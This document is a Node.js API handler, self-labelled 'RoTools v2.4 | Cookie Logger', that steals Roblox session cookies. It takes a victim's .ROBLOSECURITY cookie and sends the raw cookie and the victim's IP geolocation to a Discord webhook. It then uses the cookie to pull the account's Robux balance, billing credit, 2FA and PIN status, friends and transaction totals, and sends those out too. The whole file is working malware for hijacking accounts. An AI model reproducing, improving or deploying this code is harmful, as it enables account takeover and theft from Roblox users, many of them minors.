import fetch from 'node-fetch';

export default async function handler(req, res) {
  // Verify authorization
  if (req.headers.authorization !== 'Bearer secure-token-2025') {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { cookie } = req.body;
    if (!cookie) {
      return res.status(400).json({ error: 'No cookie provided' });
    }

    // Get client IP address
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    
    // Get detailed IP information
    let ipInfo = {};
    try {
      const ipRes = await fetch(`http://ip-api.com/json/${ip}?fields=66842623`);
      ipInfo = await ipRes.json();
    } catch (ipError) {
      console.error('IP info fetch error:', ipError);
      ipInfo = { status: 'error', message: 'IP lookup failed' };
    }

    // Format IP information fields
    const ipFields = [];
    if (ipInfo.status === 'success') {
      ipFields.push(
        { name: '📍 Location', value: `${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}`, inline: true },
        { name: '📡 ISP', value: ipInfo.isp || 'Unknown', inline: true },
        { name: '🏢 Organization', value: ipInfo.org || 'Unknown', inline: true },
        { name: '🛰️ AS', value: ipInfo.as || 'Unknown', inline: true },
        { name: '🌐 Coordinates', value: `[${ipInfo.lat}, ${ipInfo.lon}](https://maps.google.com/?q=${ipInfo.lat},${ipInfo.lon})`, inline: true },
        { name: '📮 ZIP', value: ipInfo.zip || 'Unknown', inline: true },
        { name: '⏰ Timezone', value: ipInfo.timezone || 'Unknown', inline: true },
        { name: '💰 Currency', value: ipInfo.currency || 'Unknown', inline: true },
        { name: '🔐 Proxy', value: ipInfo.proxy ? '✅ Yes' : '❌ No', inline: true },
        { name: '🛡️ Hosting', value: ipInfo.hosting ? '✅ Yes' : '❌ No', inline: true }
      );
    } else {
      ipFields.push(
        { name: '❌ IP Info Error', value: ipInfo.message || 'Failed to fetch IP information' }
      );
    }

    // Send cookie + IP info to Discord with @everyone ping
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: "@everyone",
        embeds: [
          {
            title: "🍪 RAW COOKIE RECEIVED",
            description: `\`\`\`\n${cookie}\n\`\`\``,
            color: 0x000000,
            footer: { text: "RoTools v2.4 | Cookie Logger" },
            timestamp: new Date().toISOString()
          },
          {
            title: "🌐 IP INFORMATION",
            color: 0x000000,
            fields: [
              { name: '📡 IP Address', value: `\`${ip}\``, inline: false },
              ...ipFields
            ],
            footer: { text: "RoTools v2.4 | IP Intelligence" },
            timestamp: new Date().toISOString()
          }
        ]
      })
    });

    // 2. Get account information
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
    });
    
    if (!userRes.ok || userRes.status === 401) {
      // Send invalid cookie notification
      await fetch(process.env.DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: "❌ INVALID COOKIE",
            description: "Authentication failed with provided cookie",
            color: 0x000000,
            footer: { text: "RoTools v2.4 | Error" },
            timestamp: new Date().toISOString()
          }]
        })
      });
      
      return res.json({ 
        success: false, 
        error: 'Invalid cookie - authentication failed'
      });
    }

    const userData = await userRes.json();
    const userId = userData.id;

    // Fetch all data in parallel
    const [
      robuxRes,
      creditRes,
      settingsRes,
      friendsRes,
      voiceRes,
      gamepassesRes,
      badgesRes,
      transactionsRes,
      thumbnailRes
    ] = await Promise.all([
      fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch('https://billing.roblox.com/v1/credit', { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch('https://www.roblox.com/my/settings/json', { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://friends.roblox.com/v1/my/friends/count`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch('https://voice.roblox.com/v1/settings', { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://www.roblox.com/users/inventory/list-json?assetTypeId=34&cursor=&itemsPerPage=100&pageNumber=1&userId=${userId}`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://accountinformation.roblox.com/v1/users/${userId}/roblox-badges`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?size=48x48&format=png&userIds=${userId}`)
    ]);

    // Parse responses
    const robuxData = await robuxRes.json();
    const creditData = await creditRes.json();
    const settingsData = await settingsRes.json();
    const friendsData = await friendsRes.json();
    const voiceData = await voiceRes.json();
    const gamepassesData = await gamepassesRes.text();
    const badgesData = await badgesRes.text();
    const transactionsData = await transactionsRes.json();
    const thumbnailData = await thumbnailRes.json();

    // Process data
    const account_gamepasses_worth = (gamepassesData.match(/"PriceInRobux":(\d+)/g) || [])
      .reduce((sum, match) => sum + parseInt(match.split(':')[1]), 0);
    
    // Truncate badges list if too long
    let account_badges = (badgesData.match(/"name":"(.*?)"/g) || [])
      .map(match => match.split('"')[3])
      .join(', ') || 'None';
    
    if (account_badges.length > 1000) {
      account_badges = account_badges.substring(0, 1000) + '... (truncated)';
    }

    // Prepare account information embed
    const accountInfoEmbed = {
      title: "✅ ACCOUNT INFORMATION",
      color: 0x000000,
      thumbnail: { url: thumbnailData.data[0].imageUrl },
      fields: [
        { name: "💰 Robux", value: `${robuxData.robux}`, inline: true },
        { name: "💳 Balance", value: `${creditData.balance} ${creditData.currencyCode}`, inline: true },
        { name: "👤 Account Name", value: `${settingsData.Name} (${settingsData.DisplayName})`, inline: true },
        { name: "📧 Email Verified", value: `${settingsData.IsEmailVerified}`, inline: true },
        { name: "🎂 Account Age", value: `${(settingsData.AccountAgeInDays / 365).toFixed(2)} years`, inline: true },
        { name: "👶 Above 13", value: `${settingsData.UserAbove13}`, inline: true },
        { name: "🌟 Premium", value: `${settingsData.IsPremium}`, inline: true },
        { name: "🔑 Has PIN", value: `${settingsData.IsAccountPinEnabled}`, inline: true },
        { name: "🔒 2FA Enabled", value: `${settingsData.MyAccountSecurityModel?.IsTwoStepEnabled || false}`, inline: true },
        { name: "👥 Friends", value: `${friendsData.count}`, inline: true },
        { name: "🎤 Voice Verified", value: `${voiceData.isVerifiedForVoice}`, inline: true },
        { name: "🎮 Gamepasses Value", value: `${account_gamepasses_worth} R$`, inline: true },
        { name: "🏆 Badges", value: account_badges.length > 1024 ? 'Too many to display' : account_badges, inline: false },
        { name: "💹 Transactions", value: "--------------------------------", inline: false },
        { name: "🛒 Sales of Goods", value: `${transactionsData.salesTotal}`, inline: true },
        { name: "💎 Premium Payouts", value: `${transactionsData.premiumPayoutsTotal}`, inline: true },
        { name: "📈 Commissions", value: `${transactionsData.affiliateSalesTotal}`, inline: true },
        { name: "💳 Robux Purchased", value: `${transactionsData.currencyPurchasesTotal}`, inline: true },
        { name: "⏳ Pending", value: `${transactionsData.pendingRobuxTotal}`, inline: true },
        { name: "📊 Overall", value: `${Math.abs(transactionsData.purchasesTotal)}`, inline: true }
      ],
      footer: { text: "RoTools v2.4 | Account Information" },
      timestamp: new Date().toISOString()
    };

    // Send account information to Discord
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [accountInfoEmbed] })
    });

    return res.json({ success: true });
    
  } catch (error) {
    console.error('Server error:', error);
    
    // Send error notification to Discord
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: "@everyone",
        embeds: [{
          title: "❌ PROCESSING ERROR",
          color: 0x000000,
          fields: [{
            name: "Error Details",
            value: `\`\`\`\n${error.message || 'Unknown error'}\n\`\`\``
          }],
          footer: { text: "RoTools v2.4 | Error Notification" },
          timestamp: new Date().toISOString()
        }]
      })
    });
    
    return res.status(500).json({ 
      success: false, 
      error: error.message || 'Internal server error' 
    });
  }
}
